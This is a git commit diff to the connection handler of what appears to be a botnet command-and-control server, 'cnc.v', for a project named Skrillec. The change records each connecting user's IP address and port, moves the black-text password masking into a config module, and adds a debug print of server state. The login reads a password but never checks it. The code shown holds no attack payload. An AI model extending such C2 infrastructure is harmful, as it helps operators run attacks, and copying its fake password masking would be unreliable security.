fe3c38a10cd94e1f0c3195355cb0414fbdfbd6a6
x0tic0 <87556649+x0tic0@users.noreply.github.com>
2021-11-21 14:00:05 -0500

    Update cnc.v

--- server/cnc.v
+++ server/cnc.v
@@ -4,6 +4,7 @@ import os
 import io
 import net
 import time
+import config
 import server
 
 /*
@@ -36,6 +37,8 @@ pub fn (mut s Server) set_port(port string) {
 pub fn (mut s Server) connection_handler(mut socket net.TcpConn) {
 	mut reader := io.new_buffered_reader(reader: socket)
 	mut user_ip := socket.peer_addr() or { return }
+	mut fixed_ip := "$user_ip".split("]:")[0].replace("[::ffff:", "")
+	mut fixed_port := "$user_ip".split("]:")[1]
 	print("New User Connected!: ${user_ip}\r\n")
 	mut start_current := server.Current{}
 	//Add login here then log the user's username, IP, and detect if user is using the Skrillec CLIENT to connect
@@ -44,14 +47,16 @@ pub fn (mut s Server) connection_handler(mut socket net.TcpConn) {
 	*/
 	socket.write_string("Username: ") or { 0 }
 	mut username := reader.read_line() or { "" }
-	socket.write_string("Password: \x1b[30m") or { 0 }// Black text when typing password (invisible)
+	socket.write_string("Password: ${config.Black}") or { 0 }// Black text when typing password (invisible)
 	mut password := reader.read_line() or { "" }
-	socket.write_string("\x1b[39m") or { 0 } // reset color to default
+	socket.write_string(config.Default) or { 0 } // reset color to default
 	print("New User has logged in! ${username}\r\n")
 	s.clients.u_name << username
 	s.clients.u_sockets << socket
-	// s.clients.u_ip << user_ip
+	s.clients.u_ip << fixed_ip
+	s.clients.u_port << fixed_port.int()
 	s.clients.using_client << false
+	print(s)
 	///////////////////////////////// Send to command handler after login! ///////////////////////////////////////////
 	server.cmd_handler(mut socket, mut &s, mut &start_current)
 }
